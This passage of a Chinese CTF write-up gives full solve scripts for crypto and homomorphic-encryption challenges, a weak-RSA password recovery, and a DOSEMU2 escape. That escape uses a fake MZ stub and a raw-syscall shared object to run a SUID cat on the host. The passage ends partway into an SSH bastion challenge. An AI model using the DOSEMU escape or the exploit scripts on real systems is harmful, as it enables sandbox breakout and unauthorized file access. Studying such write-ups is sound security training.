    lines = [line.strip() for line in text.splitlines() if line.strip()]
    line = next((line for line in lines if line.startswith("([") or line.startswith("((")), None)
    if line is None:
        raise RuntimeError(text)
    zeta, lam = ast.literal_eval(line)
    return line, ZZ(zeta[0]), ZZ(zeta[1]), lam


def solve_remote(host, port, max_attempts=40, min_a_hi_bits=391):
    for attempt in range(1, max_attempts + 1):
        print(f"[*] attempt {attempt}/{max_attempts}", flush=True)
        sock = socket.create_connection((host, port), timeout=15)
        try:
            banner = recv_until(sock, b"Solution? ", timeout=20.0).decode(errors="replace")
            m = re.search(r"solve\s+(s\.[A-Za-z0-9+/=._-]+)", banner)
            if not m:
                raise RuntimeError(banner)
            sock.sendall((solve_pow(m.group(1)) + "\n").encode())

            body = recv_until(sock, b"[token]: ", timeout=45.0).decode(errors="replace")
            prompt_line, A_hi, B, lam = parse_prompt(body)
            print(f"[*] A_hi_bits={A_hi.nbits()} B_bits={ZZ(abs(B)).nbits()} lambda_len={len(lam)}", flush=True)

            if A_hi.nbits() < min_a_hi_bits:
                print("[*] skip: A is a little too small for these parameters", flush=True)
                sock.close()
                continue

            token_hex = recover_token(prompt_line)
            print(f"[+] token = {token_hex}", flush=True)
            sock.sendall((token_hex + "\n").encode())
            print(recv_until(sock, b"}", timeout=20.0).decode(errors="replace"))
            return
        finally:
            sock.close()

    raise RuntimeError("no usable round")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", default=PORT, type=int)
    parser.add_argument("--prompt")
    args = parser.parse_args()

    if args.prompt:
        print(recover_token(args.prompt))
    else:
        solve_remote(args.host, args.port)
```

运行结果：

```Plain
[*] attempt 6/40
Solution:
[*] A_hi_bits=392 B_bits=751 lambda_len=470
[*] A-Coppersmith m=42 t=43 dim=85
[+] form bits: A=752 B=751 C=780 N=1531
[+] homogeneous candidates: 1
[*] row=0 m_bits=120 v_bits=121 q_bits=510
[+] token = ...
^_^ >🚩 b'actf{c0o0oppperrrsm1th_1n_3very_where}'
```

### ArrAnge in Asceding

#### 1. 源码分析

附件中的 `chal.py` 如下：

```Python
import tenseal.sealapi as sealapi
import tenseal as ts, random, base64 as b64
FLAG = "actf{redacted}"

ctx = ts.context_from(open("ctx.secret", "rb").read())
ctxdata = ctx.seal_context().data
Base = random.sample(range(512),128)
Chaos = ts.ckks_vector(ctx, Base)

print(b64.b64encode(Chaos.serialize()).decode())
open("ct.bin", 'wb').write(b64.b64decode(input("😶🌫️ :")))
(Crystal:=sealapi.Ciphertext()).load(ctxdata, "ct.bin")

decryptor = sealapi.Decryptor(ctxdata, ctx.secret_key().data)
decryptor.decrypt(Crystal, answer:=sealapi.Plaintext())

encoder = sealapi.CKKSEncoder(ctxdata)
answer = list(encoder.decode_double(answer))[:128]
if all(round(i) == sorted(Base).index(j) for i,j in zip(answer, Base)):
    print("^_^ >🚩", FLAG)
```

`setup.py` 如下：

```Python
import tenseal as ts

ctx = ts.context(
    ts.SCHEME_TYPE.CKKS,
    32768,
    coeff_mod_bit_sizes=[50]+[40]*12+[50]
)
ctx.global_scale = 2**40

secret_bytes = ctx.serialize(save_secret_key=True)
public_bytes = ctx.serialize(save_secret_key=False)
open("ctx.secret", "wb").write(secret_bytes)
open("ctx.public", "wb").write(public_bytes)

ctx.generate_galois_keys()
ctx.galois_keys().data.save("galois.key")
```

服务端随机生成 128 个互不相同的整数：

```Plain
Base = random.sample(range(512), 128)
```

然后把 `Base` 加密成 CKKS 向量发给客户端。客户端需要返回另一个密文，服务端解密后取前 128 个槽位，并检查：

```Plain
round(answer[i]) == sorted(Base).index(Base[i])
```

也就是说，返回值不是排序后的数组，而是每个原始元素在升序数组中的 rank。例如 `Base[i]` 是第 0 小，则答案第 `i` 位为 `0`；是第 127 小，则答案第 `i` 位为 `127`。

#### 2. 可用条件

`pubkey.zip` 中给出了：

- `ctx.public`：不含 secret key 的 TenSEAL context；
- `galois.key`：Galois key，用于 CKKS SIMD 旋转。

虽然没有私钥，但 `ctx.public` 中仍有 public key 和 relin key，因此可以完成：

- 加法；
- 密文乘密文；
- relinearize；
- rescale；
- 明文乘法；
- 旋转。

题目本质变成：在不知道明文 `Base` 的情况下，对加密向量同态计算每个元素的 rank。

直接比较在 CKKS 中不可用，所以使用多项式近似阶跃函数。实际使用：

```Plain
H(d) = 0.5 + 0.5 * tanh(0.60 * d)
```

为了适配 Chebyshev 多项式的区间，把输入缩放到 `[-1, 1]`：

```Plain
x = d / 512
H(d) = 0.5 + 0.5 * tanh(0.60 * 512 * x)
```

脚本中使用 511 阶 Chebyshev 插值：

```Plain
poly = Cheb.Chebyshev.interpolate(
    lambda x: 0.5 + 0.5 * np.tanh(ALPHA * 512.0 * x),
    DEGREE,
    domain=[-1, 1],
)
```

511 阶看起来很高，但 CKKS 的乘法深度有限。若直接把 Chebyshev 多项式转为普通幂基，系数会爆炸，噪声和尺度都会失控。因此脚本保留 Chebyshev 基，并使用递推公式计算：

```Plain
T_0(x) = 1
T_1(x) = x
T_{2n}(x) = 2T_n(x)^2 - 1
T_{m+n}(x) = 2T_m(x)T_n(x) - T_{|m-n|}(x)
```

同时把 511 阶多项式按 `T_32(x)` 分块。每个小块最多 31 阶，先求 `T_1..T_31`，再用 `T_32` 的幂组合，乘法深度可以压下来

#### 3. SIMD 布局

CKKS 参数为 `poly_modulus_degree=32768`，可用槽位数为：

```Plain
32768 / 2 = 16384
```

刚好可以放下一个 `128 * 128` 的矩阵。目标是把所有差值：

```Plain
x_i - x_j
```

铺到 16384 个槽位中，再一次性跑比较多项式。

由于向量旋转是循环旋转，直接旋转会把不属于当前 block 的元素卷进来，所以需要明文 mask 清掉非法槽位。脚本中分成两部分：

- `pos`：处理 `j > i` 的差值；
- `neg`：处理 `j < i` 的差值。

核心构造：

```Python
def stack_differences(he, x, stride, direction):
    terms = []
    for s in range(1, N):
        mask = [0.0] * SLOT_COUNT
        start = s * N
        if direction == "pos":
            stop = N - s
            for i in range(stop):
                mask[start + i] = 1.0
        elif direction == "neg":
            for i in range(s, N):
                mask[start + i] = 1.0
        else:
            raise ValueError(direction)
        lhs = he.rotate(x, -N * s)
        rhs = he.rotate(x, -stride * s)
        terms.append(he.mul_plain_vector_precise(he.sub(lhs, rhs), mask))
    return he.sum_many(terms)
```

`stride=127` 与 `stride=129` 分别对应相邻方向的差值拼接。非法位置被 mask 成 `0`，经过比较函数会贡献 `H(0)=0.5`。对于每个输出槽，非法槽位总贡献固定为 `64.5`，最后统一减掉：

```Plain
def solve_ciphertext(he, x):
    pos = stack_differences(he, x, 127, "pos")
    neg = stack_differences(he, x, 129, "neg")

    h_pos = compare_poly(he, pos)
    h_neg = compare_poly(he, neg)
    summed = sum_blocks_to_first(he, he.add(h_pos, h_neg))
    return he.sub_const(summed, 64.5)    
```

`sum_blocks_to_first()` 通过旋转加法把 128 个 block 的比较结果加回前 128 个槽位：

```Plain
def sum_blocks_to_first(he, ct):
    acc = ct
    for step in (128, 256, 512, 1024, 2048, 4096, 8192):
        acc = he.add(acc, he.rotate(acc, step))
    return acc
```

Exp：

```Python
#!/usr/bin/env python3
import argparse
import base64
import os
import random
import re
import socket
import subprocess
import sys
import struct
import tempfile
from pathlib import Path

import numpy as np
import tenseal as ts
import tenseal.sealapi as sealapi
from numpy.polynomial import chebyshev as Cheb


N = 128
SLOT_COUNT = N * N
SCALE = 2**40
DEGREE = 511
BABY = 32
ALPHA = 0.60
EPS = 1e-12


class HE:
    def __init__(self, ctx, galois_path=None):
        self.ctx = ctx
        self.sc = ctx.seal_context().data
        self.ev = sealapi.Evaluator(self.sc)
        self.encoder = sealapi.CKKSEncoder(self.sc)
        self.relin = ctx.relin_keys().data
        self.galois = None
        if galois_path:
            self.galois = sealapi.GaloisKeys()
            self.galois.load(self.sc, str(galois_path))

    def chain(self, ct):
        return self.sc.get_context_data(ct.parms_id()).chain_index()

    def clone(self, ct):
        out = sealapi.Ciphertext()
        self.ev.negate(ct, out)
        self.ev.negate_inplace(out)
        out.scale = ct.scale
        return out

    def mod_to(self, ct, parms_id):
        out = self.clone(ct)
        if out.parms_id() != parms_id:
            self.ev.mod_switch_to_inplace(out, parms_id)
        out.scale = SCALE
        return out

    def align(self, a, b):
        ca, cb = self.chain(a), self.chain(b)
        if ca > cb:
            a = self.mod_to(a, b.parms_id())
        elif cb > ca:
            b = self.mod_to(b, a.parms_id())
        a.scale = SCALE
        b.scale = SCALE
        return a, b

    def encode(self, value, parms_id, scale):
        pt = sealapi.Plaintext()
        self.encoder.encode(value, parms_id, float(scale), pt)
        return pt

    def add(self, a, b):
        a, b = self.align(a, b)
        out = sealapi.Ciphertext()
        self.ev.add(a, b, out)
        out.scale = SCALE
        return out

    def sub(self, a, b):
        a, b = self.align(a, b)
        out = sealapi.Ciphertext()
        self.ev.sub(a, b, out)
        out.scale = SCALE
        return out

    def add_const(self, ct, c):
        out = self.clone(ct)
        pt = self.encode(float(c), out.parms_id(), out.scale)
        self.ev.add_plain_inplace(out, pt)
        out.scale = SCALE
        return out

    def sub_const(self, ct, c):
        return self.add_const(ct, -float(c))

    def mul(self, a, b):
        a, b = self.align(a, b)
        out = sealapi.Ciphertext()
        self.ev.multiply(a, b, out)
        self.ev.relinearize_inplace(out, self.relin)
        self.ev.rescale_to_next_inplace(out)
        out.scale = SCALE
        return out

    def mul_plain_precise(self, ct, c):
        pt = self.encode(float(c), ct.parms_id(), SCALE)
        out = sealapi.Ciphertext()
        self.ev.multiply_plain(ct, pt, out)
        self.ev.rescale_to_next_inplace(out)
        out.scale = SCALE
        return out

    def mul_plain_int(self, ct, c):
        pt = self.encode(float(c), ct.parms_id(), 1.0)
        out = sealapi.Ciphertext()
        self.ev.multiply_plain(ct, pt, out)
        out.scale = ct.scale
        return out

    def mul_plain_vector_precise(self, ct, vec):
        pt = self.encode(vec, ct.parms_id(), SCALE)
        out = sealapi.Ciphertext()
        self.ev.multiply_plain(ct, pt, out)
        self.ev.rescale_to_next_inplace(out)
        out.scale = SCALE
        return out

    def rotate(self, ct, steps):
        out = sealapi.Ciphertext()
        self.ev.rotate_vector(ct, int(steps), self.galois, out)
        out.scale = ct.scale
        return out

    def sum_many(self, terms):
        terms = [t for t in terms if t is not None]
        if not terms:
            raise ValueError("empty ciphertext sum")
        target = min(terms, key=self.chain)
        acc = self.mod_to(terms[0], target.parms_id())
        for term in terms[1:]:
            acc = self.add(acc, self.mod_to(term, target.parms_id()))
        return acc


def cheb_blocks():
    poly = Cheb.Chebyshev.interpolate(
        lambda x: 0.5 + 0.5 * np.tanh(ALPHA * 512.0 * x),
        DEGREE,
        domain=[-1, 1],
    )
    coeff = poly.coef.copy()
    coeff[np.abs(coeff) < EPS] = 0.0

    divisor = np.r_[np.zeros(BABY), 1.0]
    blocks = []
    q = coeff
    while len(q) > BABY:
        q, r = Cheb.chebdiv(q, divisor)
        r = np.pad(r, (0, BABY - len(r)))
        r[np.abs(r) < EPS] = 0.0
        blocks.append(r[:BABY])
    q = np.pad(q, (0, BABY - len(q)))
    q[np.abs(q) < EPS] = 0.0
    blocks.append(q[:BABY])
    return blocks


BLOCKS = cheb_blocks()


class ChebEvaluator:
    def __init__(self, he, x):
        self.he = he
        self.memo_t = {1: x}
        self.memo_y = {}

    def T(self, n):
        if n in self.memo_t:
            return self.memo_t[n]
        if n % 2 == 0:
            half = self.T(n // 2)
            prod = self.he.mul(half, half)
            out = self.he.sub_const(self.he.add(prod, prod), 1.0)
        else:
            a = self.T((n + 1) // 2)
            b = self.T((n - 1) // 2)
            prod = self.he.mul(a, b)
            out = self.he.sub(self.he.add(prod, prod), self.T(1))
        self.memo_t[n] = out
        return out

    def Y(self, n):
        if n == 1:
            return self.T(BABY)
        if n in self.memo_y:
            return self.memo_y[n]
        a = n // 2
        b = n - a
        out = self.he.mul(self.Y(a), self.Y(b))
        self.memo_y[n] = out
        return out

    def block_value(self, coeffs):
        terms = []
        const = float(coeffs[0])
        for i, c in enumerate(coeffs[1:], 1):
            if abs(c) > EPS:
                terms.append(self.he.mul_plain_precise(self.T(i), float(c)))
        if not terms:
            zero = self.he.mul_plain_int(self.T(1), 0.0)
            return self.he.add_const(zero, const)
        out = self.he.sum_many(terms)
        if abs(const) > EPS:
            out = self.he.add_const(out, const)
        return out

    def eval(self):
        block_cts = [self.block_value(block) for block in BLOCKS]
        terms = [block_cts[0]]
        for j, block_ct in enumerate(block_cts[1:], 1):
            terms.append(self.he.mul(block_ct, self.Y(j)))
        return self.he.sum_many(terms)


def compare_poly(he, diff):
    scaled = he.mul_plain_precise(diff, 1.0 / 512.0)
    return ChebEvaluator(he, scaled).eval()


def stack_differences(he, x, stride, direction):
    terms = []
    for s in range(1, N):
        mask = [0.0] * SLOT_COUNT
        start = s * N
        if direction == "pos":
            stop = N - s
            for i in range(stop):
                mask[start + i] = 1.0
        elif direction == "neg":
            for i in range(s, N):
                mask[start + i] = 1.0
        else:
            raise ValueError(direction)
        lhs = he.rotate(x, -N * s)
        rhs = he.rotate(x, -stride * s)
        terms.append(he.mul_plain_vector_precise(he.sub(lhs, rhs), mask))
    return he.sum_many(terms)


def sum_blocks_to_first(he, ct):
    acc = ct
    for step in (128, 256, 512, 1024, 2048, 4096, 8192):
        acc = he.add(acc, he.rotate(acc, step))
    return acc


def solve_ciphertext(he, x):
    pos = stack_differences(he, x, 127, "pos")
    neg = stack_differences(he, x, 129, "neg")

    h_pos = compare_poly(he, pos)
    h_neg = compare_poly(he, neg)
    summed = sum_blocks_to_first(he, he.add(h_pos, h_neg))
    return he.sub_const(summed, 64.5)


def ciphertext_to_bytes(ct):
    with tempfile.NamedTemporaryFile(delete=False) as f:
        name = f.name
    try:
        ct.save(name)
        return Path(name).read_bytes()
    finally:
        try:
            os.unlink(name)
        except FileNotFoundError:
            pass


def load_challenge_ciphertext(ctx, data_b64):
    raw = base64.b64decode(data_b64.strip())
    vec = ts.ckks_vector_from(ctx, raw)
    return vec.ciphertext()[0]


def make_local_ciphertext(ctx, base):
    return ts.ckks_vector(ctx, base).ciphertext()[0]


def decrypt_first(he, secret_key, ct, n=128):
    dec = sealapi.Decryptor(he.sc, secret_key.data)
    pt = sealapi.Plaintext()
    dec.decrypt(ct, pt)
    return list(he.encoder.decode_double(pt))[:n]


def local_test(args):
    ctx = ts.context(
        ts.SCHEME_TYPE.CKKS,
        32768,
        coeff_mod_bit_sizes=[50] + [40] * 12 + [50],
    )
    ctx.global_scale = SCALE
    ctx.generate_galois_keys()
    he = HE(ctx)
    he.galois = ctx.galois_keys().data

    base = random.sample(range(512), N)
    x = make_local_ciphertext(ctx, base)
    ans = solve_ciphertext(he, x)
    got = [round(v) for v in decrypt_first(he, ctx.secret_key(), ans)]
    want = [sorted(base).index(v) for v in base]
    ok = got == want
    print("ok:", ok)
    if not ok:
        bad = [(i, base[i], got[i], want[i]) for i in range(N) if got[i] != want[i]]
        print("bad count:", len(bad))
        print("first bad:", bad[:10])
        vals = decrypt_first(he, ctx.secret_key(), ans)
        print("max abs err:", max(abs(vals[i] - want[i]) for i in range(N)))
    elif args.verbose:
        vals = decrypt_first(he, ctx.secret_key(), ans)
        print("max abs err:", max(abs(vals[i] - want[i]) for i in range(N)))


def remote_once(host, port, ctx_path, galois_path):
    ctx = ts.context_from(Path(ctx_path).read_bytes())
    he = HE(ctx, galois_path)

    with socket.create_connection((host, port), timeout=20) as sock:
        f = sock.makefile("rwb", buffering=0)
        first = sock.recv(4096)
        if b"proof-of-work" in first:
            text = first.decode(errors="replace")
            chal = re.findall(r"solve\s+(s\.[^\s]+)", text)[-1]
            pow_script = Path(__file__).with_name("kctf_pow.py")
            sol = subprocess.check_output(
                [sys.executable, str(pow_script), "solve", chal],
                text=True,
            ).strip()
            print("[+] pow solved")
            sock.sendall(sol.encode() + b"\n")
        else:
            f = sock.makefile("rwb", buffering=0)

        while True:
            line = f.readline().strip()
            if not line:
                raise EOFError("service closed before sending ciphertext")
            if len(line) > 1000 and re.fullmatch(rb"[A-Za-z0-9+/=]+", line):
                break
        print("[+] received challenge bytes:", len(line))
        x = load_challenge_ciphertext(ctx, line)
        ans = solve_ciphertext(he, x)
        payload = base64.b64encode(ciphertext_to_bytes(ans)) + b"\n"
        print("[+] sending response bytes:", len(payload))
        sock.sendall(payload)
        sock.settimeout(30)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
            if b"actf{" in b"".join(chunks):
                break
        resp = b"".join(chunks)
        print(resp.decode(errors="replace"))
        return resp


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local-test", action="store_true")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--host", default="1.95.113.92")
    parser.add_argument("--port", type=int, default=9999)
    parser.add_argument("--ctx", default="ctx.public")
    parser.add_argument("--galois", default="galois.key")
    args = parser.parse_args()

    if args.local_test:
        local_test(args)
    else:
        remote_once(args.host, args.port, args.ctx, args.galois)


if __name__ == "__main__":
    main()
```

## Misc

### Farthest2026

#### 1. 环境确认

连接上去之后能看到一个 `C:\>`，文件系统是 DOSEMU2 里的 MFS 映射。通过 `type Dockerfile` 能看到比较关键的几行：

```Bash
chmod u+s `which cat`
chown root:root /flag
chmod 0600 /flag
unset FLAG
cd /home/dos
exec runuser -u dos -- /usr/local/bin/start-vnc-dosemu
COPY flag /flag
COPY Dockerfile /home/dos/.dosemu/drive_c/Dockerfile
```

所以目标很明确：DOS 里当前用户是 `dos`，直接读不了 `/flag`；但是宿主机里的 `cat` 被加了 SUID，能用 `/usr/bin/cat /flag` 读到 flag。问题变成了怎样从 DOSEMU 里的 DOS 环境执行宿主侧程序。

先试过几个显眼入口：

```Plain
unix /usr/bin/cat /flag
unix -s cat /flag
elfexec X.SO
```

`unix` 这条路被 `unix_exec` 白名单限制住了，`/usr/bin/cat`、`/bin/sh` 之类都不放行。`elfexec` 也不是直接可用的，在 comcom64 的 stubless build 里会报类似：

```Plain
unsupported stub version 7
elfexec failed
```

这个时候不要急着打 `unix`，真正能用的点在 DOSEMU2 的 DJ64 loader。

#### 2. 上传文件

VNC 只有键盘输入，直接传二进制很难受：`copy con` 会吃控制字符，还会在行尾塞 CRLF。最后我先传了一个很小的 hex decoder 到 DOS 里，之后所有二进制都走：

```Plain
copy con A.TXT
<hex string>
^Z
g.com
```

`g.com` 的逻辑是读 `A.TXT` 的十六进制文本，写出二进制文件 `X.SO`。后面每次上传只要把目标文件转 hex，再跑 `g.com`，最后 `ren X.SO R.ELF` / `ren X.SO ``R.COM` 即可。

我本地用的上传脚本核心如下，VNC 发键的部分就是普通 RFB keyboard event，没什么特别：

```Python
#!/usr/bin/env python3
import argparse
import binascii
import time

from farthest_slow_type import slow_text
from farthest_vnc import VNC

ap = argparse.ArgumentParser()
ap.add_argument("host")
ap.add_argument("file")
ap.add_argument("--hex-name", default="A.TXT")
ap.add_argument("--decoder", default="g.com")
ap.add_argument("--line", type=int, default=64)
ap.add_argument("--delay", type=float, default=0.003)
args = ap.parse_args()

hx = binascii.hexlify(open(args.file, "rb").read()).decode()
lines = [hx[i:i + args.line] for i in range(0, len(hx), args.line)]

v = VNC(args.host)
slow_text(v, f"cls\ndel {args.hex_name}\ndel X.SO\ndel OUT.TXT\ncopy con {args.hex_name}\n", args.delay)
for line in lines:
    slow_text(v, line + "\n", args.delay)
slow_text(v, f"\x1a\n{args.decoder}\ndir X.SO\n", args.delay)
time.sleep(2)
v.close()
```

#### 3. 找到 DJ64 loader 入口

DOSEMU2 有一个 `DOS_HELPER_ELFLOAD` helper。官方的 `elfload.com` 本质上就是一个很短的 COM：

```c
; R.COM
bits 16
org 100h

    mov sp, stack

    ; 缩小自己的内存块，否则后面 DPMI loader 可能拿不到连续内存
    mov ah, 4ah
    mov bx, stack
    shr bx, 4
    inc bx
    int 21h

    ; al=0x60 -> DOS_HELPER_ELFLOAD
    ; ah=1    -> ELFLOAD_PLUGIN_VERSION
    ; dx=5    -> DJSTUB_API_VER
    mov al, 60h
    mov ah, 01h
    mov dx, 0005h
    int 0e6h

    mov ah, 4ch
    int 21h

stack:
```

对应机器码：

```Plain
bc1b02b44abb1b02c1eb0443cd21b060b401ba0500cde6b44ccd21
```

这个 COM 文件命名成 `R.COM` 后，DOSEMU 的 `elf_thr()` 会自动把当前程序名的后缀替换成 `.ELF`，也就是去打开同目录下的 `R.ELF`。所以后面只要控制 `R.ELF` 的内容即可。

#### 4. 构造伪 MZ stub

DJ64 stub loader 支持几种格式，其中有一段判断 MZ 头：

```Plain
if (buf[0] == 'M' && buf[1] == 'Z' && buf[8] == 4 && buf[9] == 0) {
    stub_ver = buf[0x3b];
    memcpy(&offs, &buf[0x3c], sizeof(offs));
    ...
}
```

如果设置 `STFLG1_NO32PL`，loader 不会把文件当成普通 32 位 ELF 主程序，而是把 `e_lfanew` 指向的位置当作用户 payload。这样 `R.ELF` 可以长这样：

```Plain
0x00 - 0x3f: fake MZ header
0x40 - end : 64-bit ELF shared object
```

关键字段：

```Plain
MZ header:
  [0x00:0x02] = "MZ"
  [0x08:0x0a] = 0x0004
  [0x1c:0x20] = payload size
  [0x38]      = 0x86
  [0x3b]      = 7
  [0x3c:0x40] = 0x40
```

这里 `0x86` 很关键：

```Plain
0x80 = STFLG1_NO32PL
0x02 = SHM_EXCL
0x04 = SHM_NEW_NS
```

一开始只用了 `0x82`，payload 会落到普通 shm 上，`dlopen` 失败。加上 `SHM_NEW_NS` 后，DOSEMU 会在自己的临时目录里创建 payload 文件，权限和挂载状态都合适，DJ64 能正常 `dlopen`。

生成 `R.ELF` 的脚本：

```Python
#!/usr/bin/env python3
from pathlib import Path

payload = Path("payload.so").read_bytes()

h = bytearray(0x40)
h[0:2] = b"MZ"
h[8:10] = (4).to_bytes(2, "little")
h[0x1c:0x20] = len(payload).to_bytes(4, "little")
h[0x38] = 0x86          # NO32PL | SHM_EXCL | SHM_NEW_NS
h[0x3b] = 7             # current dj64 stub version
h[0x3c:0x40] = (0x40).to_bytes(4, "little")

Path("R.ELF").write_bytes(h + payload)
print("R.ELF size =", len(h) + len(payload))
```

#### 5. 宿主侧 payload

`R.ELF` 里真正的 payload 是一个 x86_64 shared object。DJ64 打开库时需要几个符号：

```Plain
main
dj64init_once
dj64init
dj64done
```

把读 flag 的动作放在 `dj64init_once()` 里。因为 Dockerfile 已经给 `/usr/bin/cat` 加了 SUID，所以这里直接 fork + execve `/usr/bin/cat /flag`，把 stdout/stderr 重定向到 DOS C 盘对应的宿主路径：

```Plain
/home/dos/.dosemu/drive_c/OUT.TXT
```

完整 payload：

```C++
typedef unsigned long size_t;

struct dj64_api;
struct elf_ops;

typedef int dj64cdispatch_t(int handle, int libid, int fn,
                            unsigned esi, unsigned char *sp);

static long sc0(long n) {
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "a"(n)
                     : "rcx", "r11", "memory");
    return r;
}

static long sc1(long n, long a) {
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "a"(n), "D"(a)
                     : "rcx", "r11", "memory");
    return r;
}

static long sc2(long n, long a, long b) {
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b)
                     : "rcx", "r11", "memory");
    return r;
}

static long sc3(long n, long a, long b, long c) {
    long r;
    __asm__ volatile("syscall" : "=a"(r)
                     : "a"(n), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return r;
}

static long sc4(long n, long a, long b, long c, long d) {
    long r;
    register long r10 __asm__("r10") = d;
    __asm__ volatile("syscall" : "=a"(r)
                     : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10)
                     : "rcx", "r11", "memory");
    return r;
}

static void run_cat(void) {
    static char out[] = "/home/dos/.dosemu/drive_c/OUT.TXT";
    static char cat[] = "/usr/bin/cat";
    static char flag[] = "/flag";
    static char fail[] = "exec failed\n";
    static char *argv[] = {cat, flag, 0};
    static char *envp[] = {0};

    long pid = sc0(57);             // fork
    if (pid == 0) {
        long fd = sc3(2, (long)out, 1 | 64 | 512, 0666);  // open O_WRONLY|O_CREAT|O_TRUNC
        if (fd >= 0) {
            sc2(33, fd, 1);         // dup2(fd, stdout)
            sc2(33, fd, 2);         // dup2(fd, stderr)
            sc1(3, fd);             // close(fd)
        }
        sc3(59, (long)cat, (long)argv, (long)envp);       // execve
        sc3(1, 1, (long)fail, sizeof(fail) - 1);
        sc1(60, 1);
    } else if (pid > 0) {
        int status = 0;
        sc4(61, pid, (long)&status, 0, 0);                // wait4
    }
}

static int dummy_dispatch(int handle, int libid, int fn,
                          unsigned esi, unsigned char *sp) {
    (void)handle;
    (void)libid;
    (void)fn;
    (void)esi;
    (void)sp;
    return 0;
}

static dj64cdispatch_t *dispatchers[] = {
    dummy_dispatch,
    dummy_dispatch
};

void _binary_tmp_o_elf_start(void) {}
void _binary_tmp_o_elf_end(void) {}

int main(int argc, char **argv) {
    (void)argc;
    (void)argv;
    return 0;
}

int dj64init_once(const struct dj64_api *api, int api_ver) {
    (void)api;
    (void)api_ver;
    run_cat();
    return 0;
}

dj64cdispatch_t **dj64init(int handle, const struct elf_ops *ops,
                           void *m, int full) {
    (void)handle;
    (void)ops;
    (void)m;
    (void)full;
    return dispatchers;
}

void dj64done(int handle) {
    (void)handle;
}
```

#### 6. 利用流程

本地生成两个文件：

```Python
# 1. 生成 64 位 shared object
clang -target x86_64-linux-gnu -nostdlib -shared -fuse-ld=lld -fPIC \
  -fno-asynchronous-unwind-tables -fno-unwind-tables \
  -Wl,--hash-style=sysv,--build-id=none,-s \
  payload.c -o payload.so

# 2. 生成 fake MZ + payload 的 R.ELF
python3 make_relf.py

# 3. 生成 R.COM
python3 - <<'PY'
from pathlib import Path
Path("R.COM").write_bytes(bytes.fromhex(
    "bc1b02b44abb1b02c1eb0443cd21"
    "b060b401ba0500cde6b44ccd21"
))
PY
```

传到 DOS 环境：

```Plain
# 上传 R.ELF，目标侧会生成 X.SO
python3 upload_hex.py <host> R.ELF --decoder g.com

# DOS 里改名
ren X.SO R.ELF

# 上传 R.COM，目标侧会生成 X.SO
python3 upload_hex.py <host> R.COM --decoder g.com

# DOS 里改名并执行
ren X.SO R.COM
R.COM
type OUT.TXT
```

执行后 `OUT.TXT` 内容：

```Plain
ACTF{ba6k_t2_th3_ag1s_wIth0uT_a9ents_KeHo7P1oYx}
```

### ZJUAM Just Uses Awful Math

#### **题目分析**

题目给了一个登录过程的抓包。先看流量结构，可以发现整个过程只有 21 个包，而且都是明文 HTTP，请求顺序很清楚：

1. 访问 `/cas/login`
2. 访问 `/cas/v2/getPubKey`
3. 向 `/cas/login` 提交表单

这一步已经说明题目的核心不在复杂协议，而在登录表单里的加密逻辑。

继续看登录页里的前端代码，可以还原出密码提交方式。关键逻辑如下：

```JavaScript
function checkForm(){
    if($("#username").val()==''){
        $("#username").focus();
        return false;
    }

    if($("#password").val()==''){
        $("#password").focus();
        return false;
    }
    if($("#kaptcha").css("display")!="none" && $("#authcode").val()==''){
        $("#authcode").focus();
        return false;
    }
    var password = $("#password").val();
    var key = new RSAUtils.getKeyPair(public_exponent, "", Modulus);
    var reversedPwd = password.split("").reverse().join("");
    var encrypedPwd = RSAUtils.encryptedString(key,reversedPwd);
    $("#password").val(encrypedPwd);
    $("#fm1").submit();
}
```

这段代码说明了三件事：

1. 用户输入的密码会先被倒序
2. 倒序后的字符串会用前端 RSA 公钥加密
3. 加密结果直接作为 `password` 字段提交

抓包里可以拿到提交参数：

```Plain
username=player
password=3feda45e7937f5c1cd414f55cb6df0755dd7f65302f1d9eca3b309dfb9869724
```

也可以拿到公钥接口返回值：

```JSON
{"modulus":"90011418f37a7a075aead75a9829d38eb2d750fd17bb24e5861b89d7658a88c3","exponent":"10001"}
```

指数是常见的 `65537`，重点在模数。这个模数只有 256 位，强度很弱，直接分解即可。

分解结果为：

```Plain
p = 202555251191383333988748320354737959551
q = 321566364572398185024295275472079273917
```

接下来按 RSA 标准流程求私钥，再解密抓包里的密文。由于前端在加密前做了倒序，所以解出来的明文还需要再反转一次。

#### **解题脚本**

```Python
from math import gcd

p = 202555251191383333988748320354737959551
q = 321566364572398185024295275472079273917
n = p * q
e = 65537
c = int("3feda45e7937f5c1cd414f55cb6df0755dd7f65302f1d9eca3b309dfb9869724", 16)

phi = (p - 1) * (q - 1)

def exgcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x1, y1 = exgcd(b, a % b)
    return g, y1, x1 - (a // b) * y1

_, x, _ = exgcd(e, phi)
d = x % phi
m = pow(c, d, n)

# 这里按照前端 RSAUtils.decryptedString 的方式还原字符串
chars = []
while m > 0:
    digit = m & 0xffff
    chars.append(chr(digit & 0xff))
    chars.append(chr((digit >> 8) & 0xff))
    m >>= 16

reversed_password = "".join(chars).rstrip("\x00")
flag = reversed_password[::-1]

print(reversed_password)
print(flag)
```

运行后得到：

```Plain
}dLR0w_EHT_sev@s_SLT{AAA
AAA{TLS_s@ves_THE_w0RLd}
```

### special day

签到

### ezssh

#### **题目入口**

题目先给了一个实例申请接口。调用之后会返回一台 SSH 主机的地址、端口和用户名。

示例命令如下：

```Bash
curl -sS -X POST 'http://101.245.110.151:9999/instance' \
  -H 'Content-Type: application/json' \
  -d '{"enroll_token":"<你的 token>"}'
```

拿到返回值后，直接连接 SSH：

```Bash
ssh guest@101.245.110.151 -p <返回的端口>
```

这里的认证一共分两段：

1. 第一段是系统口令
2. 第二段是 Team token

实测第一段口令是 `guest`，第二段直接填写申请实例时使用的 `enroll_token`。

进入后拿到的是一台 bastion。

#### **第一段利用链：从 bastion 走到第二个用户**

先在 bastion 上做基本枚举，可以看出当前 `guest` 权限很低，但机器上还有另一个用户，第一段 flag 也属于这个用户。

